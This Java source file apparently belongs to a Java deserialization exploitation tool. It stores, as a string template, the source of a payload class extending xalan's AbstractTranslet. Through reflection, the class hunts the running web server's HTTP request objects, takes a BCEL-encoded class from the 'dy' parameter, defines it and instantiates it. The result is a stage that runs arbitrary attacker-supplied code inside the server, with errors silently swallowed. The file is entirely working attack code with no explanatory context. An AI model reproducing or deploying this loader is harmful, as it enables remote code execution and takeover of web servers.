package com.Classes;

public class getrequest {
    public static String className="GetRequest";
    public static String getrequest="import com.sun.org.apache.bcel.internal.classfile.Utility;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.*;\n" +
            "public class GetRequest extends AbstractTranslet {\n" +
            "    public GetRequest() {\n" +
            "        try {\n" +
            "            String dy = null;\n" +
            "            boolean done = false;\n" +
            "            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));\n" +
            "\n" +
            "            for (int i = 0; i < ts.length; ++i) {\n" +
            "                Thread t = ts[i];\n" +
            "                if (t != null) {\n" +
            "                    String s = t.getName();\n" +
            "                    if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
            "                        Object o = getFV(t, \"target\");\n" +
            "                        if (o instanceof Runnable) {\n" +
            "                            try {\n" +
            "                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
            "                            } catch (Exception var16) {\n" +
            "                                continue;\n" +
            "                            }\n" +
            "\n" +
            "                            List ps = (List) getFV(o, \"processors\");\n" +
            "\n" +
            "                            for (int j = 0; j < ps.size(); ++j) {\n" +
            "                                Object p = ps.get(j);\n" +
            "                                o = getFV(p, \"req\");\n" +
            "                                Object resp = o.getClass().getMethod(\"getResponse\").invoke(o);\n" +
            "                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));\n" +
            "                                dy = (String) conreq.getClass().getMethod(\"getParameter\", String.class).invoke(conreq, new String(\"dy\"));\n" +
            "                                if (dy != null && !dy.isEmpty()) {\n" +
            "                                    byte[] bytecodes = Utility.decode(dy,false);\n" +
            "                                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                                    defineClassMethod.setAccessible(true);\n" +
            "                                    Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));\n" +
            "                                    cc.newInstance();\n" +
            "                                    done = true;\n" +
            "                                }\n" +
            "\n" +
            "                                if (done) {\n" +
            "                                    break;\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception var17) {\n" +
            "        }\n" +
            "    }\n" +
            "    private Object getFV(Object o, String s) throws Exception {\n" +
            "        Field f = null;\n" +
            "        Class clazz = o.getClass();\n" +
            "\n" +
            "        while (clazz != Object.class) {\n" +
            "            try {\n" +
            "                f = clazz.getDeclaredField(s);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                clazz = clazz.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (f == null) {\n" +
            "            throw new NoSuchFieldException(s);\n" +
            "        } else {\n" +
            "            f.setAccessible(true);\n" +
            "            return f.get(o);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "}\n";
}
